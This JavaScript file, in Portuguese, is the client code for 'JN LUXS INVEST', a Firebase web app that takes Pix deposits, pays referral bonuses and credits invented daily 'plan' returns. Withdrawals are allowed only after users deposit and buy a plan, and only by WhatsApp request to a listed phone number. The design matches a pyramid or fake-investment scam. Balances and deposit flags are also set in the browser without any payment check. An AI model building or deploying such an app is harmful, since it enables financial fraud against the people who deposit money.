import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
import { getAuth, signInWithEmailAndPassword, createUserWithEmailAndPassword, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-auth.js";
import { getDatabase, ref, set, get, update, onValue, increment } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-database.js";

const firebaseConfig = {
    apiKey: "AIzaSyC9itAsl1TKllIoVmhCq0KNDiJ4OanaPLw",
    authDomain: "jn-luxs-invest.firebaseapp.com",
    databaseURL: "https://jn-luxs-invest-default-rtdb.firebaseio.com",
    projectId: "jn-luxs-invest",
    storageBucket: "jn-luxs-invest.firebasestorage.app",
    messagingSenderId: "120002983828",
    appId: "1:120002983828:web:a9437ea04198852c6ec181"
};

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getDatabase(app);
let usuarioAtual = null;
let dadosUser = {};

window.entrarOuCadastrar = function() {
    const email = document.getElementById('campo-email').value;
    const senha = document.getElementById('campo-senha').value;
    const params = new URLSearchParams(window.location.search);
    const indicadoPor = params.get('ref');

    signInWithEmailAndPassword(auth, email, senha).catch(() => {
        return createUserWithEmailAndPassword(auth, email, senha).then((res) => {
            const uid = res.user.uid;
            set(ref(db, 'usuarios/' + uid), { 
                email, saldo: 0, rendimentoDiario: 0, depositou: false, comprouPlano: false 
            });
            if(indicadoPor) {
                update(ref(db, 'usuarios/' + indicadoPor), { saldo: increment(3.20) });
            }
        });
    }).catch(e => alert("Erro: " + e.message));
};

onAuthStateChanged(auth, (user) => {
    if (user) {
        usuarioAtual = user;
        const linkElem = document.getElementById('link-afiliado');
        linkElem.value = window.location.origin + window.location.pathname + "?ref=" + user.uid;
        document.getElementById('tela-login').style.display = 'none';
        document.getElementById('painel-usuario').style.display = 'block';
        document.getElementById('nome-cliente').innerText = user.email.split('@')[0];
        onValue(ref(db, 'usuarios/' + user.uid), (snap) => {
            dadosUser = snap.val();
            document.getElementById('valor-saldo').innerText = "R$ " + (dadosUser.saldo || 0).toFixed(2);
        });
        setInterval(processarRendimento, 30000);
    }
});

async function processarRendimento() {
    if (!usuarioAtual || !dadosUser.rendimentoDiario) return;
    const agora = Date.now();
    const ultima = dadosUser.ultimaAtualizacao || agora;
    const lucro = ((agora - ultima) * (dadosUser.rendimentoDiario / 86400000));
    if (lucro > 0.001) {
        await update(ref(db, 'usuarios/' + usuarioAtual.uid), { 
            saldo: dadosUser.saldo + lucro, ultimaAtualizacao: agora 
        });
    }
}

window.depositar = async function() {
    const v = parseFloat(document.getElementById('valor-deposito').value);
    if (v >= 60) {
        await update(ref(db, 'usuarios/' + usuarioAtual.uid), { depositou: true });
        const pix = `00020101021126580014br.gov.bcb.pix013601f92187-bc64-4c33-b5e9-c9d563e9b9665204000053039865405${v.toFixed(2)}5802BR5915JN_LUXS_INVEST6008BRASILIA62070503***6304`;
        document.getElementById('area-pix').style.display = 'block';
        document.getElementById('pix-copia-cola').value = pix;
        document.getElementById('qrcode-img').innerHTML = `<img src="https://chart.googleapis.com/chart?chs=150x150&cht=qr&chl=${encodeURIComponent(pix)}">`;
    } else { alert("Mínimo R$ 60"); }
};

window.comprarPlano = async (custo, rend) => {
    if (dadosUser.saldo >= custo) {
        await update(ref(db, 'usuarios/' + usuarioAtual.uid), { 
            saldo: dadosUser.saldo - custo, rendimentoDiario: rend, ultimaAtualizacao: Date.now(), comprouPlano: true 
        });
        alert("Plano ativado!");
    } else { alert("Saldo insuficiente!"); }
};

window.sacar = () => {
    if (!dadosUser.depositou || !dadosUser.comprouPlano) {
        alert("Erro: Para sacar o saldo de bônus, você só saca se comprar o produto e ter depositado!");
    } else if (dadosUser.saldo < 20) {
        alert("Mínimo R$ 20 para saque.");
    } else {
        window.open(`https://wa.me/5589994222704?text=Olá, solicito saque de R$ ${dadosUser.saldo.toFixed(2)}`);
    }
};

window.copiarLink = () => { document.getElementById('link-afiliado').select(); document.execCommand("copy"); alert("Link copiado!"); };
window.copiarPix = () => { document.getElementById('pix-copia-cola').select(); document.execCommand("copy"); alert("Pix Copiado!"); };
window.abrirSuporte = () => window.open("https://wa.me/5589994222704?text=Olá, preciso de suporte na JN LUXS.");
